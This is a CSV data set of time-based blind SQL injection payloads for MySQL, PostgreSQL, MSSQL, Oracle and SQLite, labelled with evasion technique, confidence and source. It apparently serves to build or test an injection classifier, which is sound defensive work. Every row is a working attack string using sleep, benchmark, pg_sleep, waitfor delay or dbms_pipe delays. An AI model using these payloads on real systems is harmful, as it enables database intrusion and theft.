payload,sqli_type,db_engine,evasion_tech,confidence,classification_method,source,context
pg_sleep ( 5 ) --,time_blind,postgresql,,0.46,rule,sqliv5_csv,unknown
1 ) or sleep ( 5 ) #,time_blind,mysql,,0.45,rule,sqliv5_csv,unknown
"1 ) ) or benchmark ( 10000000,MD5 ( 1 ) ) #",time_blind,mysql,,0.45,rule,sqliv5_csv,unknown
""" or benchmark ( 10000000,MD5 ( 1 ) ) #",time_blind,mysql,,0.45,rule,sqliv5_csv,unknown
) or sleep ( 5 ) = ',time_blind,mysql,,0.45,rule,sqliv5_csv,unknown
") ) or benchmark ( 10000000,MD5 ( 1 ) ) #",time_blind,mysql,,0.45,rule,sqliv5_csv,unknown
""" ) ) or benchmark ( 10000000,MD5 ( 1 ) ) #",time_blind,mysql,,0.45,rule,sqliv5_csv,unknown
) ) ;waitfor delay '0:0:5'--,time_blind,mssql,,0.46,rule,sqliv5_csv,string_single_quote
1 or sleep ( 5 ) #,time_blind,mysql,,0.45,rule,sqliv5_csv,unknown
""" or pg_sleep ( 5 ) --",time_blind,postgresql,,0.46,rule,sqliv5_csv,unknown
"1 ) or benchmark ( 10000000,MD5 ( 1 ) ) #",time_blind,mysql,,0.45,rule,sqliv5_csv,unknown
""" ) ) ;waitfor delay '0:0:5'--",time_blind,mssql,,0.46,rule,sqliv5_csv,string_single_quote
1 ) ) or pg_sleep ( 5 ) --,time_blind,postgresql,,0.46,rule,sqliv5_csv,unknown
"1 or benchmark ( 10000000,MD5 ( 1 ) ) #",time_blind,mysql,,0.45,rule,sqliv5_csv,unknown
or pg_sleep ( 5 ) --,time_blind,postgresql,,0.46,rule,sqliv5_csv,unknown
""" ) or sleep ( 5 ) = """,time_blind,mysql,,0.45,rule,sqliv5_csv,unknown
) or pg_sleep ( 5 ) --,time_blind,postgresql,,0.46,rule,sqliv5_csv,unknown
or sleep ( 5 ) #,time_blind,mysql,,0.45,rule,sqliv5_csv,unknown
or sleep ( 5 ) = ',time_blind,mysql,,0.45,rule,sqliv5_csv,unknown
") or benchmark ( 10000000,MD5 ( 1 ) ) #",time_blind,mysql,,0.45,rule,sqliv5_csv,unknown
;waitfor delay '0:0:5'--,time_blind,mssql,,0.46,rule,sqliv5_csv,string_single_quote
"or benchmark ( 10000000,MD5 ( 1 ) ) #",time_blind,mysql,,0.45,rule,sqliv5_csv,unknown
""" ) ;waitfor delay '0:0:5'--",time_blind,mssql,,0.46,rule,sqliv5_csv,string_single_quote
""" ) ) or sleep ( 5 ) = """,time_blind,mysql,,0.45,rule,sqliv5_csv,unknown
""" ) or pg_sleep ( 5 ) --",time_blind,postgresql,,0.46,rule,sqliv5_csv,unknown
1 or pg_sleep ( 5 ) --,time_blind,postgresql,,0.46,rule,sqliv5_csv,unknown
) ) or pg_sleep ( 5 ) --,time_blind,postgresql,,0.46,rule,sqliv5_csv,unknown
1 ) ) or sleep ( 5 ) #,time_blind,mysql,,0.45,rule,sqliv5_csv,unknown
) ;waitfor delay '0:0:5'--,time_blind,mssql,,0.46,rule,sqliv5_csv,string_single_quote
""" ) or benchmark ( 10000000,MD5 ( 1 ) ) #",time_blind,mysql,,0.45,rule,sqliv5_csv,unknown
) ) or sleep ( 5 ) = ',time_blind,mysql,,0.45,rule,sqliv5_csv,unknown
""" ) ) or pg_sleep ( 5 ) --",time_blind,postgresql,,0.46,rule,sqliv5_csv,unknown
"' or benchmark ( 10000000,MD5 ( 1 ) ) #",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"' ) ) or benchmark ( 10000000,MD5 ( 1 ) ) #",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
' ) ;waitfor delay '0:0:5'--,time_blind,mssql,,0.46,rule,sqliv2_csv,string_single_quote
' or sleep ( 5 ) = ',time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
""" or sleep ( 5 ) = """,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
sleep ( 5 ) #,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"' ) or benchmark ( 10000000,MD5 ( 1 ) ) #",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
' ) or pg_sleep ( 5 ) --,time_blind,postgresql,,0.46,rule,sqliv2_csv,unknown
' ) ) or sleep ( 5 ) = ',time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
' or sleep ( 5 ) #,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
';waitfor delay '0:0:5'--,time_blind,mssql,,0.46,rule,sqliv2_csv,string_single_quote
' or pg_sleep ( 5 ) --,time_blind,postgresql,,0.46,rule,sqliv2_csv,unknown
' ) ) or pg_sleep ( 5 ) --,time_blind,postgresql,,0.46,rule,sqliv2_csv,unknown
' ) or sleep ( 5 ) = ',time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
' ) ) ;waitfor delay '0:0:5'--,time_blind,mssql,,0.46,rule,sqliv2_csv,string_single_quote
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( ( 6866 = 6866",time_blind,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"1"" ) ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
"1', ( select ( case when ( 9443 = 9443 ) then sleep ( 5 ) else 9443* ( select 9443 from information_schema.character_sets ) end ) )",time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1"" ) ) as dnhd where 2657 = 2657 or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",time_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
"1' ) where 6941 = 6941 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",time_blind,oracle,,0.41,rule,sqliv2_csv,unknown
"1 where 5466 = 5466 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,hex_string,0.4,rule,sqliv2_csv,unknown
"1"" ) or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and ( ""baia"" = ""baia",time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1"" ) and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) and ( ""jozh"" = ""jozh",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1 ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( 'mfib' = 'mfib",time_blind,sqlite,case_variation,0.53,rule,sqliv2_csv,unknown
1 ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1 ) ) as potk where 5040 = 5040 or elt ( 5873 = 5873,sleep ( 5 ) ) #",time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
"1%"" ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --",time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"select pg_sleep ( 5 ) and ( ""%"" = """,time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1' ) ) as bedq where 8781 = 8781 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) --",time_blind,mysql,hex_string,0.4,rule,sqliv2_csv,unknown
"1' ) as rvch where 1863 = 1863 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.47,rule,sqliv2_csv,unknown
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ( 'ztmd' = 'ztmd",time_blind,oracle,case_variation,0.51,rule,sqliv2_csv,unknown
"1"" ) ) as klie where 2840 = 2840 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,hex_string,0.4,rule,sqliv2_csv,unknown
1 ) ) as pzoo where 8036 = 8036 or 6793 = ( select 6793 from pg_sleep ( 5 ) ) --,time_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
"1 ) where 6784 = 6784 and elt ( 3114 = 3114,sleep ( 5 ) ) #",time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
"1' or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and 'xmnd' = 'xmnd",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
"1"" ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
1' ) ) rlike sleep ( 5 ) and ( ( 'iwct' = 'iwct,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1"" ) ) as vbpl where 3885 = 3885 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --",time_blind,postgresql,case_variation,0.41,rule,sqliv2_csv,unknown
select pg_sleep ( 5 ) and ( ( 'enpn' like 'enpn,time_blind,postgresql,case_variation|function_alternative,0.46,rule,sqliv2_csv,unknown
1' ) where 7629 = 7629 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #,time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
1%' ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1%' or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and '%' = '",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
1'|| ( select 'tfqg' from dual where 9862 = 9862 and ( select * from ( select ( sleep ( 5 ) ) ) gcrr ) #,time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( 'nimx' = 'nimx",time_blind,sqlite,case_variation,0.53,rule,sqliv2_csv,unknown
"1'|| ( select 'kojx' from dual where 8140 = 8140 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,case_variation|hex_string,0.4,rule,sqliv2_csv,unknown
1' ) ) as kahn where 1361 = 1361 or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"1' ) ) or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
"select like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( 'dthp' = 'dthp",time_blind,sqlite,case_variation,0.53,rule,sqliv2_csv,unknown
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and ""ulfr"" like ""ulfr",time_blind,oracle,case_variation|function_alternative,0.51,rule,sqliv2_csv,unknown
"1' ) ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual ) ||'",time_blind,oracle,case_variation,0.51,rule,sqliv2_csv,unknown
1' where 7191 = 7191 rlike sleep ( 5 ) --,time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
"1"" ) where 1330 = 1330 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) --",time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"1 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) -- kfqs",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
"1'+ ( select 'qrml' where 3791 = 3791 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) ) +'",time_blind,sqlite,case_variation,0.47,rule,sqliv2_csv,unknown
"1%"" ) ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1%"" and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1"" ) ) ) or elt ( 5873 = 5873,sleep ( 5 ) ) #",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1%' or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and '%' = '",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
"1"" or elt ( 6272 = 6272,sleep ( 5 ) )",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1%' ) ) ) and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1%' ) ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
1' ) rlike sleep ( 5 ) #,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1"" where 7739 = 7739 and sleep ( 5 ) --",time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
"1' where 5702 = 5702 and elt ( 3114 = 3114,sleep ( 5 ) ) #",time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
"1"" ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ""nbfe"" = ""nbfe",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
"1%"" ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
1 ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ),time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1'|| ( select 'svbf' where 7017 = 7017 or elt ( 6272 = 6272,sleep ( 5 ) ) ) ||'",time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
1'|| ( select 'wadx' where 4287 = 4287 or sleep ( 5 ) #,time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"1' ) as ibqr where 5372 = 5372 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,,0.41,rule,sqliv2_csv,unknown
"1"" ) as xioc where 7260 = 7260 or elt ( 5873 = 5873,sleep ( 5 ) ) #",time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
"1"" ) rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) and ( ""cneo"" like ""cneo",time_blind,mysql,case_variation|function_alternative,0.45,rule,sqliv2_csv,unknown
"1%"" ) rlike sleep ( 5 ) and ( ""%"" = """,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1' ) as xvcr where 6456 = 6456 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",time_blind,mysql,hex_string,0.4,rule,sqliv2_csv,unknown
"select benchmark ( 5000000,md5 ( 0x4c4d6142 ) ) and ( '%' = '",time_blind,mysql,case_variation|hex_string,0.45,rule,sqliv2_csv,unknown
"1 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) # igen",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1"" ) as rnjx where 2679 = 2679 and 2388 = benchmark ( 5000000,md5 ( 0x6d457153 ) ) #",time_blind,mysql,hex_string,0.4,rule,sqliv2_csv,unknown
"1"" or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ""pxix"" = ""pxix",time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1' ) ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ( 'xngr' = 'xngr",time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
"1"" and 6969 = ( select 6969 from pg_sleep ( 5 ) ) and ""twmy"" = ""twmy",time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1'|| ( select 'ersu' where 4123 = 4123 and 8312 = dbms_pipe.receive_message ( chr ( 69 ) ||chr ( 79 ) ||chr ( 101 ) ||chr ( 68 ) ,5 ) --",time_blind,oracle,case_variation,0.41,rule,sqliv2_csv,unknown
"1'+ ( select 'iyvn' where 9358 = 9358 or elt ( 6272 = 6272,sleep ( 5 ) ) ) +'",time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
select sleep ( 5 ) and ( ( 'mmvf' like 'mmvf,time_blind,mysql,case_variation|function_alternative,0.45,rule,sqliv2_csv,unknown
1%' and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and '%' = ',time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
( select * from ( select ( sleep ( 5 ) ) ) srmq ) --,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
( select * from ( select ( sleep ( 5 ) ) ) srmq ) and 'fdgq' = 'fdgq,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
1 ) rlike sleep ( 5 ) #,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual--",time_blind,oracle,case_variation,0.51,rule,sqliv2_csv,unknown
1 ) ) ) and sleep ( 5 ) and ( ( ( 6618 = 6618,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1%"" ) and elt ( 3114 = 3114,sleep ( 5 ) ) #",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1"" ) waitfor delay '0:0:5' and ( ""hhzy"" like ""hhzy",time_blind,mssql,function_alternative,0.46,rule,sqliv2_csv,unknown
"1"" or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ""menm"" like ""menm",time_blind,sqlite,function_alternative,0.53,rule,sqliv2_csv,unknown
1' ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ( 'jrpk' = 'jrpk,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
1 ) ) ) waitfor delay '0:0:5'--,time_blind,mssql,,0.46,rule,sqliv2_csv,string_single_quote
"1 ) ) as nxdf where 1696 = 1696 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,hex_string,0.4,rule,sqliv2_csv,unknown
1 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) -- paxv,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"select dbms_pipe.receive_message ( chr ( 66 ) ||chr ( 67 ) ||chr ( 79 ) ||chr ( 101 ) ,5 ) from dual and 'lckw' = 'lckw",time_blind,oracle,case_variation,0.51,rule,sqliv2_csv,unknown
"1'+ ( select 'vwzp' where 2729 = 2729 or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",time_blind,oracle,case_variation,0.41,rule,sqliv2_csv,unknown
"1' and elt ( 1210 = 1210,sleep ( 5 ) ) and 'ioar' = 'ioar",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
1 or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) # lwfs,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
( select * from ( select ( sleep ( 5 ) ) ) srmq ) and ( ( 'nbzf' like 'nbzf,time_blind,mysql,case_variation|function_alternative,0.45,rule,sqliv2_csv,unknown
1' ) ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"waitfor delay '0:0:5' and ( ""ludp"" like ""ludp",time_blind,mssql,function_alternative,0.46,rule,sqliv2_csv,unknown
1 where 5691 = 5691 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --,time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"select sleep ( 5 ) and ""cyrb"" = ""cyrb",time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
"1"" ) ) ) rlike sleep ( 5 ) and ( ( ( ""eefg"" = ""eefg",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1"" ) ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ""lxue"" like ""lxue",time_blind,sqlite,function_alternative,0.53,rule,sqliv2_csv,unknown
"1 ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ( 9558 = 9558",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1' ) ) ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( ( ( 'cjre' = 'cjre",time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
1' ) where 7908 = 7908 or sleep ( 5 ) --,time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
"1"" ) ) ) and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ( ( ""oohx"" like ""oohx",time_blind,sqlite,function_alternative,0.53,rule,sqliv2_csv,unknown
1' or 6793 = ( select 6793 from pg_sleep ( 5 ) ) and 'dogx' = 'dogx,time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
1' ) ) and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) and ( ( 'wevl' = 'wevl,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
1' ) ) ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1"" ) or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --",time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
1 ) ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
"1"" ) where 3122 = 3122 and sleep ( 5 ) #",time_blind,mysql,,0.4,rule,sqliv2_csv,unknown
1 and sleep ( 5 ) -- ruuv,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1' ) ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( ( 'cimm' like 'cimm",time_blind,oracle,function_alternative,0.46,rule,sqliv2_csv,unknown
"1"" ) ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ( ""ijag"" = ""ijag",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1' ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1 ) ) as kycl where 8008 = 8008 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.47,rule,sqliv2_csv,unknown
"1"" where 2035 = 2035 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",time_blind,mysql,hex_string,0.4,rule,sqliv2_csv,unknown
"1' ) ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
"1"" ) ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",time_blind,mysql,hex_string,0.45,rule,sqliv2_csv,unknown
"1'+ ( select afst where 7454 = 7454 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) ) +'",time_blind,sqlite,case_variation,0.47,rule,sqliv2_csv,unknown
1 ) ) ) or ( select * from ( select ( sleep ( 5 ) ) ) sddo ) #,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
1' ) where 6244 = 6244 rlike ( select * from ( select ( sleep ( 5 ) ) ) sgvo ) --,time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"1"" ) ) or ( select * from ( select ( sleep ( 5 ) ) ) ydpu ) and ( ( ""imlq"" like ""imlq",time_blind,mysql,case_variation|function_alternative,0.45,rule,sqliv2_csv,unknown
1' ) ) or sleep ( 5 ) and ( ( 'uzhd' like 'uzhd,time_blind,mysql,function_alternative,0.45,rule,sqliv2_csv,unknown
1%' ) ) or sleep ( 5 ) #,time_blind,mysql,,0.45,rule,sqliv2_csv,unknown
"1%"" ) or 2633 = dbms_pipe.receive_message ( chr ( 112 ) ||chr ( 65 ) ||chr ( 65 ) ||chr ( 103 ) ,5 ) and ( ""%"" = """,time_blind,oracle,,0.46,rule,sqliv2_csv,unknown
"1%"" ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.53,rule,sqliv2_csv,unknown
1%' or 4240 = ( select 4240 from pg_sleep ( 5 ) ) --,time_blind,postgresql,case_variation,0.46,rule,sqliv2_csv,unknown
1'+ ( select mavu where 4276 = 4276 rlike sleep ( 5 ) #,time_blind,mysql,case_variation,0.4,rule,sqliv2_csv,unknown
"1"" ) where 3404 = 3404 and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",time_blind,sqlite,,0.47,rule,sqliv2_csv,unknown
"select sleep ( 5 ) and ""%"" = """,time_blind,mysql,case_variation,0.45,rule,sqliv2_csv,unknown
